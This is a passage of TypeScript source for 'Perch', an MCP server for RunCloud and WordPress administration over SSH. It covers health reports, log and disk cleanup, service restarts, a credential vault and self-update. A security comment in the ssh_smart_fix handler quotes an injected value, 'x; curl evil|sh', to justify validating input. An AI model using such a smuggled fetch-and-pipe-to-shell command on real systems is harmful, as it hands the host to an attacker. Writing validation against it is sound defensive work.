      case "multi_server_dashboard": {
        const serversRes = await runcloudRequest("GET", "/servers?perPage=40") as Record<string, unknown>;
        const servers = (serversRes.data ?? []) as Record<string, unknown>[];
        const rows = await Promise.allSettled(servers.map(async (s) => {
          const [health, stats] = await Promise.allSettled([
            runcloudRequest("GET", `/servers/${s.id}/health/latest`),
            runcloudRequest("GET", `/servers/${s.id}/stats`),
          ]);
          const h = health.status === "fulfilled" ? health.value as Record<string, unknown> : {};
          const st = stats.status === "fulfilled" ? stats.value as Record<string, unknown> : {};
          return {
            id: s.id, name: s.name, ip: s.ipAddress, online: s.online, connected: s.connected,
            memory: h.memoryUsagePercent ? `${h.memoryUsagePercent}%` : "n/a",
            disk: h.diskUsagePercent ? `${h.diskUsagePercent}%` : "n/a",
            load: h.loadAverage ?? "n/a",
            webapps: st.webAppCount ?? "n/a",
            databases: st.databaseCount ?? "n/a",
          };
        }));
        result = rows.map((r) => r.status === "fulfilled" ? r.value : { error: (r as PromiseRejectedResult).reason?.message });
        break;
      }
      case "failed_services_scan": {
        const serversRes = await runcloudRequest("GET", "/servers?perPage=40") as Record<string, unknown>;
        const servers = (serversRes.data ?? []) as Record<string, unknown>[];
        const issues: unknown[] = [];
        await Promise.allSettled(servers.map(async (s) => {
          try {
            const svcs = await runcloudRequest("GET", `/servers/${s.id}/services`) as Record<string, unknown>;
            const list = (svcs.data ?? []) as Record<string, unknown>[];
            for (const svc of list) {
              if (svc.status === "stopped" || svc.isRunning === false) {
                issues.push({ server: s.name, serverId: s.id, service: svc.realName, status: svc.status });
              }
            }
          } catch { /* skip offline servers */ }
        }));
        result = { totalIssues: issues.length, issues: issues.length === 0 ? "All services running across all servers" : issues };
        break;
      }

      // ── SECURITY ────────────────────────────────────────────────────────
      case "security_audit": {
        const sid = a.serverId as number;
        const [firewall, sshKeys, fail2ban, externalApis] = await Promise.allSettled([
          runcloudRequest("GET", `/servers/${sid}/security/firewalls?perPage=40`),
          runcloudRequest("GET", `/servers/${sid}/sshcredentials?perPage=40`),
          runcloudRequest("GET", `/servers/${sid}/security/fail2ban/blockedip`),
          runcloudRequest("GET", `/settings/externalapi?perPage=40`),
        ]);
        result = {
          firewallRules: firewall.status === "fulfilled" ? firewall.value : { error: (firewall as PromiseRejectedResult).reason?.message },
          sshKeys: sshKeys.status === "fulfilled" ? sshKeys.value : { error: (sshKeys as PromiseRejectedResult).reason?.message },
          fail2banBlockedIPs: fail2ban.status === "fulfilled" ? fail2ban.value : { error: (fail2ban as PromiseRejectedResult).reason?.message },
          externalApis: externalApis.status === "fulfilled" ? externalApis.value : { error: (externalApis as PromiseRejectedResult).reason?.message },
        };
        break;
      }
      case "open_ports_report": {
        const sid = a.serverId as number;
        const res = await runcloudRequest("GET", `/servers/${sid}/security/firewalls?perPage=40`) as Record<string, unknown>;
        const rules = (res.data ?? []) as Record<string, unknown>[];
        const open = rules.filter((r) => !r.ipAddress || r.ipAddress === "0.0.0.0" || r.ipAddress === "::");
        result = {
          server: sid,
          totalRules: rules.length,
          openToAll: open.length,
          rules: open.map((r) => ({ port: r.port, protocol: r.protocol, type: r.type, action: r.firewallAction })),
          note: open.length === 0 ? "No globally open ports found" : `${open.length} port(s) open to all IPs — review if intentional`,
        };
        break;
      }

      // ── DEPLOYMENT ──────────────────────────────────────────────────────
      case "deploy_and_verify": {
        const sid = a.serverId as number;
        const wid = a.webAppId as number;
        const gid = a.gitId as number;
        // Force deploy
        const deploy = await runcloudRequest("PUT", `/servers/${sid}/webapps/${wid}/git/${gid}/script`);
        // Get webapp state + logs in parallel
        const [webapp, logs] = await Promise.allSettled([
          runcloudRequest("GET", `/servers/${sid}/webapps/${wid}`),
          runcloudRequest("GET", `/servers/${sid}/webapps/${wid}/log?perPage=50`),
        ]);
        result = {
          deployTriggered: true,
          deployResponse: deploy,
          webappStatus: webapp.status === "fulfilled" ? webapp.value : { error: (webapp as PromiseRejectedResult).reason?.message },
          recentLogs: logs.status === "fulfilled" ? logs.value : { error: (logs as PromiseRejectedResult).reason?.message },
        };
        break;
      }

      // ── WORDPRESS SSH ────────────────────────────────────────────────────
      case "wp_health_check": {
        const ip = await getServerIP(a.serverId as number);
        const u = a.username as string;
        const p = a.password as string;
        const path = a.appPath as string;
        const [info, checksums, plugins, cron] = await Promise.allSettled([
          sshExec(ip, u, p, `wp --info --allow-root 2>&1 | head -20`, 20000),
          sshExec(ip, u, p, `cd ${shellEscape(validatePath(path))} && wp core verify-checksums --allow-root 2>&1`, 30000),
          sshExec(ip, u, p, `cd ${shellEscape(validatePath(path))} && wp plugin list --status=active --format=count --allow-root 2>&1`, 15000),
          sshExec(ip, u, p, `cd ${shellEscape(validatePath(path))} && wp cron event list --format=count --allow-root 2>&1`, 15000),
        ]);
        result = {
          host: ip,
          appPath: path,
          wpCLIInfo: info.status === "fulfilled" ? info.value.stdout : "unavailable",
          coreChecksums: checksums.status === "fulfilled" ? checksums.value.stdout : "unavailable",
          activePluginCount: plugins.status === "fulfilled" ? plugins.value.stdout : "unavailable",
          scheduledCronEvents: cron.status === "fulfilled" ? cron.value.stdout : "unavailable",
        };
        break;
      }
      case "wp_outdated_plugins": {
        const ip = await getServerIP(a.serverId as number);
        const cmd = `cd ${shellEscape(validatePath(a.appPath as string))} && wp plugin list --update=available --fields=name,version,update_version --format=table --allow-root 2>&1`;
        const out = await sshExec(ip, a.username as string, a.password as string, cmd, 60000);
        result = { host: ip, appPath: a.appPath, output: out.stdout || out.stderr, exitCode: out.code };
        break;
      }
      case "wp_admin_audit": {
        const ip = await getServerIP(a.serverId as number);
        const cmd = `cd ${shellEscape(validatePath(a.appPath as string))} && wp user list --role=administrator --fields=ID,user_login,user_email,user_registered --format=table --allow-root 2>&1`;
        const out = await sshExec(ip, a.username as string, a.password as string, cmd, 30000);
        result = { host: ip, appPath: a.appPath, adminUsers: out.stdout || out.stderr, exitCode: out.code };
        break;
      }
      case "wp_clear_all_caches": {
        const ip = await getServerIP(a.serverId as number);
        const u = a.username as string;
        const p = a.password as string;
        const path = a.appPath as string;
        const flushRedis = a.flushRedis === true;
        const cmds = [
          `cd ${shellEscape(validatePath(path))} && wp cache flush --allow-root 2>&1`,
          `php -r "if(function_exists('opcache_reset')){opcache_reset();echo 'OPcache cleared';}else{echo 'OPcache not available';}" 2>&1`,
        ];
        if (flushRedis) cmds.push(`redis-cli FLUSHDB 2>&1`);
        const results = await Promise.allSettled(cmds.map((cmd) => sshExec(ip, u, p, cmd, 30000)));
        result = {
          host: ip,
          wpCacheFlush: results[0].status === "fulfilled" ? (results[0].value as {stdout: string}).stdout : "failed",
          opCacheReset: results[1].status === "fulfilled" ? (results[1].value as {stdout: string}).stdout : "failed",
          redisFlush: flushRedis ? (results[2]?.status === "fulfilled" ? (results[2].value as {stdout: string}).stdout : "failed") : "skipped",
        };
        break;
      }

      // ── PERFORMANCE (SSH) ────────────────────────────────────────────────
      case "server_load_report": {
        const ip = await getServerIP(a.serverId as number);
        const u = a.username as string;
        const p = a.password as string;
        const [uptime, memory, disk, processes] = await Promise.allSettled([
          sshExec(ip, u, p, "uptime", 10000),
          sshExec(ip, u, p, "free -h", 10000),
          sshExec(ip, u, p, "df -h --output=source,size,used,avail,pcent,target | head -20", 10000),
          sshExec(ip, u, p, "ps aux --sort=-%mem | head -6 | awk '{print $1,$2,$3,$4,$11}'", 10000),
        ]);
        result = {
          host: ip,
          uptime: uptime.status === "fulfilled" ? uptime.value.stdout : "unavailable",
          memory: memory.status === "fulfilled" ? memory.value.stdout : "unavailable",
          disk: disk.status === "fulfilled" ? disk.value.stdout : "unavailable",
          topProcessesByMemory: processes.status === "fulfilled" ? processes.value.stdout : "unavailable",
        };
        break;
      }
      case "nginx_top_ips": {
        const ip = await getServerIP(a.serverId as number);
        const logPath = (a.logPath as string) ?? "/var/log/nginx/access.log";
        const cmd = `awk '{print $1}' ${shellEscape(validatePath(logPath))} | sort | uniq -c | sort -rn | head -15 2>&1`;
        const out = await sshExec(ip, a.username as string, a.password as string, cmd, 20000);
        result = { host: ip, logPath, topIPs: out.stdout || out.stderr, exitCode: out.code };
        break;
      }
      case "php_error_summary": {
        const ip = await getServerIP(a.serverId as number);
        const logPath = a.logPath as string;
        const u = a.username as string;
        const p = a.password as string;
        const [total, last20, grouped] = await Promise.allSettled([
          sshExec(ip, u, p, `wc -l < ${shellEscape(validatePath(logPath))} 2>&1`, 10000),
          sshExec(ip, u, p, `tail -20 ${shellEscape(validatePath(logPath))} 2>&1`, 10000),
          sshExec(ip, u, p, `grep -oP '(?<=PHP )(Fatal error|Warning|Notice|Parse error|Deprecated)' ${shellEscape(validatePath(logPath))} | sort | uniq -c | sort -rn 2>&1`, 15000),
        ]);
        result = {
          host: ip,
          logPath,
          totalLines: total.status === "fulfilled" ? total.value.stdout : "unavailable",
          errorTypeCounts: grouped.status === "fulfilled" ? grouped.value.stdout : "unavailable",
          last20Lines: last20.status === "fulfilled" ? last20.value.stdout : "unavailable",
        };
        break;
      }

      // ── SERVER MONITOR & SELF-HEAL ──────────────────────────────────────────

      case "ssh_server_status": {
        const out = await sshExec(
          a.host as string, a.username as string, a.password as string,
          `NGINX=$(systemctl is-active nginx-rc 2>/dev/null); [ "$NGINX" = "active" ] || NGINX=$(systemctl is-active nginx 2>/dev/null || echo "not found")
MEM_TOTAL=$(free -m | awk 'NR==2{print $2}'); MEM_USED=$(free -m | awk 'NR==2{print $3}')
MEM_FREE=$(free -m | awk 'NR==2{print $7}'); MEM_PCT=$(free | awk 'NR==2{printf "%d",($3/$2)*100}')
DISK_USED=$(df -h / | awk 'NR==2{print $3}'); DISK_TOTAL=$(df -h / | awk 'NR==2{print $2}')
DISK_PCT=$(df / | awk 'NR==2{gsub(/%/,"");print $5}')
LOAD=$(awk '{print $1,$2,$3}' /proc/loadavg); CORES=$(nproc)
UPTIME=$(uptime -p 2>/dev/null || uptime | sed 's/.*up //;s/,.*//')
ORPHANS=$(ps -eo ppid,comm 2>/dev/null | awk '$1==1&&$2!="init"&&$2!="systemd"&&$2!="(sd-pam)"&&$2!="dbus-daemon"' | wc -l | tr -d ' ')
TOP5=$(ps aux --no-header --sort=-%mem 2>/dev/null | head -5 | awk '{printf "  %-40s MEM:%-5s CPU:%s\n",$11,$4,$3}')
printf "=== Server Status ===\nUptime: %s\nRAM: %sMB / %sMB (%s%% used, %sMB free)\nDisk: %s / %s (%s%%)\nLoad: %s (%s cores)\nNginx/Web: %s\nOrphans (PPID=1): %s\n\n=== Top Processes by Memory ===\n%s\n" "$UPTIME" "$MEM_USED" "$MEM_TOTAL" "$MEM_PCT" "$MEM_FREE" "$DISK_USED" "$DISK_TOTAL" "$DISK_PCT" "$LOAD" "$CORES" "$NGINX" "$ORPHANS" "$TOP5"`,
          30000
        );
        result = { host: a.host, output: out.stdout || out.stderr };
        break;
      }

      case "ssh_smart_fix": {
        // SECURITY [C1]: validate nginxService before interpolating into shell.
        // Without this, an attacker (or buggy MCP caller) could inject arbitrary
        // commands via nginxService: "x; curl evil|sh".
        const rawNsvc = (a.nginxService as string) || "auto";
        const nsvc = rawNsvc === "auto" ? "auto" : validateServiceName(rawNsvc);
        const out = await sshExec(
          a.host as string, a.username as string, a.password as string,
          `ISSUES=(); FIXES=()
[ "${nsvc}" = "auto" ] && (systemctl list-units --all 2>/dev/null | grep -q nginx-rc && NSVC=nginx-rc || NSVC=nginx) || NSVC="${nsvc}"
NGINX_UP=$(systemctl is-active $NSVC 2>/dev/null)
MEM_PCT=$(free | awk 'NR==2{printf "%d",($3/$2)*100}')
DISK_PCT=$(df / | awk 'NR==2{gsub(/%/,"");print $5}')
ORPHAN_N=$(ps -eo ppid,comm 2>/dev/null | awk '$1==1&&$2!="init"&&$2!="systemd"&&$2!="(sd-pam)"&&$2!="dbus-daemon"' | wc -l | tr -d ' ')
[ "$NGINX_UP" != "active" ] && ISSUES+=("$NSVC was $NGINX_UP") && sudo systemctl restart $NSVC 2>/dev/null && sleep 1 && NEW=$(systemctl is-active $NSVC) && ([ "$NEW" = "active" ] && FIXES+=("Restarted $NSVC — now active") || FIXES+=("WARNING: $NSVC still $NEW"))
[ "$ORPHAN_N" -gt 10 ] && ISSUES+=("$ORPHAN_N orphan procs (PPID=1)") && ps -eo ppid,pid,comm 2>/dev/null | awk '$1==1&&$3!="init"&&$3!="systemd"&&$3!="(sd-pam)"' | awk '{print $2}' | xargs kill -9 2>/dev/null; [ "$ORPHAN_N" -gt 10 ] && FIXES+=("Killed $ORPHAN_N orphan processes")
if [ "$MEM_PCT" -gt 88 ]; then ISSUES+=("Memory at \${MEM_PCT}%"); PM2=$(which pm2 2>/dev/null || find /home -name pm2 -maxdepth 6 2>/dev/null | head -1); [ -n "$PM2" ] && $PM2 restart all 2>/dev/null && sleep 3; NEW_MEM=$(free | awk 'NR==2{printf "%d",($3/$2)*100}'); FIXES+=("Restarted PM2 — memory now \${NEW_MEM}%"); fi
[ "$DISK_PCT" -gt 88 ] && ISSUES+=("Disk at \${DISK_PCT}%") && find /var/log /home -name "*.log" -size +50M 2>/dev/null -exec truncate -s 0 {} \; && FIXES+=("Cleared large log files")
FINAL_MEM=$(free | awk 'NR==2{printf "%d",($3/$2)*100}'); FINAL_DISK=$(df / | awk 'NR==2{gsub(/%/,"");print $5}'); FINAL_NGINX=$(systemctl is-active $NSVC 2>/dev/null)
if [ \${#ISSUES[@]} -eq 0 ]; then echo "All systems healthy — nothing needed fixing"; echo "RAM: \${MEM_PCT}% | Disk: \${DISK_PCT}% | \${NSVC}: \${NGINX_UP}"
else echo "\${#ISSUES[@]} issue(s) found and fixed:"; for i in "\${ISSUES[@]}"; do echo "  • $i"; done; echo ""; echo "Actions taken:"; for f in "\${FIXES[@]}"; do echo "  ✓ $f"; done; echo ""; echo "Now: RAM \${FINAL_MEM}% | Disk \${FINAL_DISK}% | \${NSVC}: \${FINAL_NGINX}"; fi`,
          90000
        );
        result = { host: a.host, nginxService: nsvc, output: out.stdout || out.stderr };
        break;
      }

      case "ssh_restart_service": {
        const svc = a.service as string;
        const safeSvc = validateServiceName(svc);
        const out = await sshExec(
          a.host as string, a.username as string, a.password as string,
          `SVC="${safeSvc}"
[ "$SVC" = "nginx" ] && systemctl list-units --all 2>/dev/null | grep -q nginx-rc && SVC=nginx-rc
if [ "$SVC" = "n8n" ]; then
  if systemctl list-units --all 2>/dev/null | grep -q " n8n."; then sudo systemctl restart n8n 2>&1; echo "n8n restarted via systemd: $(systemctl is-active n8n)"
  else PM2=$(which pm2 2>/dev/null || find /home -name pm2 -maxdepth 6 2>/dev/null | head -1); [ -n "$PM2" ] && $PM2 restart n8n 2>&1 | tail -3 && echo "n8n restarted via PM2" || echo "n8n: no systemd service or PM2 found"; fi
elif [ "$SVC" = "pm2" ]; then
  PM2=$(which pm2 2>/dev/null || find /home -name pm2 -maxdepth 6 2>/dev/null | head -1)
  [ -n "$PM2" ] && $PM2 restart all 2>&1 | tail -5 && echo "PM2 all restarted" || echo "PM2 not found"
else sudo systemctl restart $SVC 2>&1; sleep 1; echo "Service $SVC — status: $(systemctl is-active $SVC 2>/dev/null)"; fi`,
          30000
        );
        result = { host: a.host, service: svc, output: out.stdout || out.stderr };
        break;
      }

      case "ssh_kill_orphans": {
        const dryRun     = (a.dryRun as boolean) !== false;
        if (a.processName && !/^[a-zA-Z0-9._-]+$/.test(a.processName as string)) throw new Error("Process name contains invalid characters");
        const nameFilter = a.processName ? `&& $3=="${a.processName as string}"` : "";
        const killCmd    = dryRun
          ? `echo "(dry-run: pass dryRun=false to actually kill)"`
          : `PIDS=$(echo "$ORPHANS" | awk '{print $2}' | tr '\n' ' '); [ -n "$(echo $PIDS | tr -d ' ')" ] && echo $PIDS | xargs kill -9 2>/dev/null && echo "Killed $COUNT orphan(s)" || echo "Nothing to kill"`;
        const out = await sshExec(
          a.host as string, a.username as string, a.password as string,
          `ORPHANS=$(ps -eo ppid,pid,comm 2>/dev/null | awk '$1==1&&$3!="init"&&$3!="systemd"&&$3!="(sd-pam)"&&$3!="dbus-daemon" ${nameFilter}')
COUNT=$(echo "$ORPHANS" | grep -c . 2>/dev/null || echo 0)
echo "=== Orphan Processes (PPID=1) ==="; echo "$ORPHANS" | awk '{printf "PID %-8s  %s\n",$2,$3}'; echo ""; echo "Total: $COUNT"; ${killCmd}`,
          20000
        );
        result = { host: a.host, dryRun, processName: a.processName || null, output: out.stdout || out.stderr };
        break;
      }

      case "ssh_disk_cleanup": {
        const minMB = validateNumeric(a.minSizeMB ?? 50, "minSizeMB", 1, 10000);
        const dryRun = (a.dryRun as boolean) !== false;
        const clearCmd = dryRun
          ? `echo "(dry-run: pass dryRun=false to clear files)"`
          : `echo "=== Clearing ==="; find /var/log /home /tmp -name "*.log" -size +${minMB}M 2>/dev/null -exec sh -c 'sz=$(du -sh "$1" 2>/dev/null|cut -f1); truncate -s 0 "$1" && echo "Cleared $sz: $1"' _ {} \;; df -h / | awk 'NR==2{printf "Disk now: %s / %s (%s)\n",$3,$2,$5}'`;
        const out = await sshExec(
          a.host as string, a.username as string, a.password as string,
          `df -h / | awk 'NR==2{printf "Disk: %s / %s (%s)\n",$3,$2,$5}'
echo "=== Files > ${minMB}MB ==="; find /var/log /home /tmp -name "*.log" -size +${minMB}M 2>/dev/null -exec du -sh {} \; | sort -rh | head -20
${clearCmd}`,
          30000
        );
        result = { host: a.host, dryRun, minSizeMB: minMB, output: out.stdout || out.stderr };
        break;
      }

      case "ssh_check_ports": {
        const ports = (a.ports as number[] ?? []).map(p => validateNumeric(p, "port", 1, 65535));
        const grep  = ports.length > 0 ? `| grep -E ":(${ports.join("|")})\\b"` : "";
        const out   = await sshExec(
          a.host as string, a.username as string, a.password as string,
          `echo "=== Listening Ports ==="; ss -tlnp 2>/dev/null ${grep} | awk 'NR>1{print}' | sort -k4 -V`,
          15000
        );
        result = { host: a.host, portsFilter: ports.length > 0 ? ports : "all", output: out.stdout || out.stderr };
        break;
      }

      case "telegram_send_alert": {
        const body: Record<string, unknown> = {
          chat_id: a.chatId, text: a.message, parse_mode: "Markdown",
        };
        if (a.includeButtons) {
          body.reply_markup = {
            inline_keyboard: [
              [{ text: "📊 Status", callback_data: "status" }, { text: "🔧 Smart Fix", callback_data: "fix" }],
              [{ text: "🌐 Nginx", callback_data: "fix-nginx" }, { text: "💾 Disk", callback_data: "disk" }, { text: "✅ Ignore", callback_data: "ignore" }],
            ],
          };
        }
        const resp = await fetch(`https://api.telegram.org/bot${a.botToken as string}/sendMessage`, {
          method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body),
        });
        const json = await resp.json() as Record<string, unknown>;
        result = { ok: json.ok, messageId: (json.result as Record<string, unknown>)?.message_id, error: json.description };
        break;
      }

      // ── PERCH INTELLIGENCE ──────────────────────────────────────────────

      case "perch_brain":
        result = getBrain(brain);
        break;

      case "perch_webapp_history":
        result = getWebappHistory(brain, a.domain as string);
        break;

      case "perch_detect_webapp": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        result = await detectWebappType(
          { host: a.host as string, username: a.username as string, auth },
          a.webroot as string
        );
        break;
      }

      // ── PERCH: WORDPRESS DB ──────────────────────────────────────────────

      case "perch_wp_db_audit": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        const sshOpts = { host: a.host as string, username: a.username as string, auth };
        const dbResult = await auditDatabase(sshOpts, a.wpPath as string, a.wpUser as string, a.dbName as string);
        if (a.domain) incrementKnowledge(brain, "wp_db_audit", "scheduled_audit", "none");
        result = dbResult;
        break;
      }

      case "perch_wp_db_clean": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        const sshOpts = { host: a.host as string, username: a.username as string, auth };
        result = await cleanTransients(sshOpts, a.wpPath as string, a.wpUser as string);
        break;
      }

      // ── PERCH: WORDPRESS PLUGINS ─────────────────────────────────────────

      case "perch_wp_plugins": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        const sshOpts = { host: a.host as string, username: a.username as string, auth };
        result = await auditPlugins(sshOpts, a.wpPath as string, a.wpUser as string);
        break;
      }

      case "perch_wp_plugin_update": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        const sshOpts = { host: a.host as string, username: a.username as string, auth };
        result = await updatePlugin(sshOpts, a.wpPath as string, a.wpUser as string, a.slug as string);
        break;
      }

      case "perch_wp_plugin_deactivate": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        const sshOpts = { host: a.host as string, username: a.username as string, auth };
        const deactRes = await deactivatePlugin(sshOpts, a.wpPath as string, a.wpUser as string, a.slug as string);
        // Log to actions_log so /perch_undo can reverse this.
        // Auth secrets are NOT stored — caller must reprovide on undo.
        logAction(brain, {
          action_type: "wp_plugin_deactivate",
          target: (a.domain as string) || (a.host as string),
          args: { wpPath: a.wpPath, wpUser: a.wpUser, slug: a.slug, host: a.host, username: a.username },
          before_state: { plugin_was_active: true, slug: a.slug },
          result: deactRes as unknown as Record<string, unknown>,
          ok: (deactRes as { success: boolean }).success !== false,
        });
        result = deactRes;
        break;
      }

      // ── PERCH: WORDPRESS SECURITY ────────────────────────────────────────

      case "perch_wp_security": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        const sshOpts = { host: a.host as string, username: a.username as string, auth };
        result = await auditSecurity(sshOpts, a.wpPath as string, a.wpUser as string, a.domain as string);
        break;
      }

      // ── PERCH: WORDPRESS BACKUP ──────────────────────────────────────────

      case "perch_wp_backup": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        const sshOpts = { host: a.host as string, username: a.username as string, auth };
        result = await checkBackupHealth(sshOpts, a.webroot as string, a.domain as string);
        break;
      }

      // ── PERCH: WORDPRESS IMAGES ──────────────────────────────────────────

      case "perch_wp_images_scan": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        const sshOpts = { host: a.host as string, username: a.username as string, auth };
        result = await scanImages(sshOpts, a.uploadsPath as string);
        break;
      }

      case "perch_wp_images_optimize": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        const sshOpts = { host: a.host as string, username: a.username as string, auth };
        result = await optimizeImages(sshOpts, a.uploadsPath as string, {
          generateWebp: (a.generateWebp as boolean) !== false,
          losslessOnly: true,
          dryRun: (a.dryRun as boolean) === true,
        });
        break;
      }

      // ── PERCH: WORDPRESS PERFORMANCE ────────────────────────────────────

      case "perch_wp_perf": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        const sshOpts = { host: a.host as string, username: a.username as string, auth };
        result = await snapshotPerformance(sshOpts, a.wpPath as string, a.wpUser as string, a.domain as string);
        break;
      }

      // ── PERCH: BRAIN SEARCH / UNDO / DASHBOARD / UPDATE ─────────────────

      case "perch_brain_search": {
        const limit = a.limit ? Number(a.limit) : 20;
        result = searchProblems(brain, a.query as string, limit);
        break;
      }

      case "perch_actions_log": {
        const limit = a.limit ? Number(a.limit) : 10;
        result = getRecentActions(brain, limit);
        break;
      }

      case "perch_undo": {
        const actionId = a.actionId ? Number(a.actionId) : undefined;
        const action = getActionForUndo(brain, actionId);
        if (!action) { result = { ok: false, error: "no undoable action found" }; break; }
        if (action.action_type === "wp_plugin_deactivate") {
          const args = action.args as Record<string, unknown>;
          const auth = a.privateKey
            ? { type: "key" as const, privateKey: a.privateKey as string }
            : { type: "password" as const, password: (a.password ?? "") as string };
          const sshOpts = {
            host: (a.host as string) || (args.host as string),
            username: (a.username as string) || (args.username as string),
            auth,
          };
          const wpPath = args.wpPath as string;
          const wpUser = args.wpUser as string;
          const slug = args.slug as string;
          const r = await wpCli(sshOpts, wpPath, wpUser, `plugin activate ${slug}`);
          markActionUndone(brain, action.id);
          result = {
            ok: r.code === 0,
            undone: { id: action.id, action_type: action.action_type, target: action.target },
            output: r.stdout || r.stderr,
          };
        } else {
          result = { ok: false, error: `action_type '${action.action_type}' is not undoable yet` };
        }
        break;
      }

      case "perch_multi_server_dashboard": {
        const verbose = a.verbose === true;
        const servers = await paginateAll("/servers");
        const summaries: Array<Record<string, unknown>> = [];
        for (const s of servers as Array<Record<string, unknown>>) {
          const sid = s.id as number;
          let stats: Record<string, unknown> = {};
          try {
            stats = (await runcloudRequest("GET", `/servers/${sid}/stats`)) as Record<string, unknown>;
          } catch { /* keep empty */ }
          const data = (stats.data as Record<string, unknown>) || stats;
          summaries.push({
            id: sid,
            name: s.name,
            ip: s.ipAddress,
            online: s.online,
            connected: s.connected,
            ramPct: data.memoryUsage,
            diskPct: data.diskUsage,
            cpuPct: verbose ? data.cpuUsage : undefined,
            load: verbose ? data.loadAverage : undefined,
          });
        }
        result = { ok: true, count: summaries.length, servers: summaries };
        break;
      }

      case "perch_self_update": {
        const dryRun = a.dryRun === true;
        const { execSync } = await import("node:child_process");
        try {
          execSync("git fetch origin", { cwd: process.cwd(), stdio: "pipe" });
          const localSha = execSync("git rev-parse HEAD", { cwd: process.cwd() }).toString().trim();
          const remoteSha = execSync("git rev-parse origin/main", { cwd: process.cwd() }).toString().trim();
          if (localSha === remoteSha) {
            result = { ok: true, upToDate: true, sha: localSha.slice(0, 7) };
            break;
          }
          const ahead = execSync(`git rev-list --count HEAD..origin/main`, { cwd: process.cwd() }).toString().trim();
          const log = execSync(`git log --oneline HEAD..origin/main`, { cwd: process.cwd() }).toString().trim();
          if (dryRun) {
            result = { ok: true, upToDate: false, dryRun: true, commitsBehind: Number(ahead), changelog: log };
            break;
          }
          execSync("git pull --ff-only origin main && npm install --no-fund --no-audit --silent && npm run build --silent",
            { cwd: process.cwd(), stdio: "pipe" });
          const newSha = execSync("git rev-parse HEAD", { cwd: process.cwd() }).toString().trim();
          result = {
            ok: true, upToDate: false, dryRun: false,
            from: localSha.slice(0, 7), to: newSha.slice(0, 7),
            commitsApplied: Number(ahead),
            changelog: log,
            note: "Restart Perch process to load the new build (systemctl restart perch).",
          };
        } catch (err) {
          result = { ok: false, error: err instanceof Error ? err.message : String(err) };
        }
        break;
      }

      // ── PERCH: VAULT ────────────────────────────────────────────────────

      case "perch_vault_put": {
        vaultPut(a.id as string, a.value as string, a.label as string | undefined);
        result = { ok: true, id: a.id, message: "Credential stored encrypted." };
        break;
      }
      case "perch_vault_get": {
        const v = vaultGet(a.id as string);
        result = v === null
          ? { ok: false, error: `No vault entry: ${a.id}` }
          : { ok: true, id: a.id, value: v };
        break;
      }
      case "perch_vault_list": {
        result = { ok: true, exists: vaultExists(), entries: vaultList() };
        break;
      }
      case "perch_vault_delete": {
        const deleted = vaultDelete(a.id as string);
        result = { ok: deleted, id: a.id, message: deleted ? "Deleted." : "Not found." };
        break;
      }

      // ── PERCH: WORDPRESS ERROR DIAGNOSIS ────────────────────────────────

      case "perch_wp_errors": {
        const auth = a.privateKey
          ? { type: "key" as const, privateKey: a.privateKey as string }
          : { type: "password" as const, password: (a.password ?? "") as string };
        const sshOpts = { host: a.host as string, username: a.username as string, auth };
        const diagnosis = await diagnoseErrors(
          sshOpts, a.wpPath as string, a.wpUser as string, a.domain as string,
          a.lines ? Number(a.lines) : 200
        );
        // Log to brain if we found a problem
        if (diagnosis.likelyCause) {
          logProblem(brain, {
            type: diagnosis.isWhiteScreen ? "white_screen" : "php_error",
            root_cause: diagnosis.likelyCause,
            raw_log_snippet: diagnosis.rawLogLines.join("\n").slice(0, 2000),
          });
        }
        result = diagnosis;
        break;
      }

      default:
        throw new Error(`Unknown tool: ${name}`);
    }

    return {
      content: [{ type: "text", text: JSON.stringify(result, null, 2) }],
    };
  } catch (error) {
    const msg = error instanceof Error ? error.message : String(error);
    // Centralized redaction — catches Bearer, password, PEM keys, RunCloud/Telegram/Slack/AWS/GitHub tokens,
    // wp-config secrets, env-var-style secrets, and shortens /home/{user}/... paths.
    const safeMsg = safeTruncate(safeForOutput(msg), 1500);
    // Detect missing-credential scenarios and produce a friendly hint.
    const hint = /environment variable is not set|RUNCLOUD_API_KEY|PERCH_MASTER_KEY|password is required|privateKey/i.test(msg)
      ? "\n\nHint: Perch needs SSH credentials or an API key. Store them with /perch_vault_put or set the env var, then retry."
      : "";
    return {
      content: [{ type: "text", text: `Error: ${safeMsg}${hint}` }],
      isError: true,
    };
  }
});

// ─── START ────────────────────────────────────────────────────────────────────

async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
  console.error("Perch MCP v2.0 running on stdio");
}

main().catch((err) => {
  console.error("Fatal error:", err);
  process.exit(1);
});
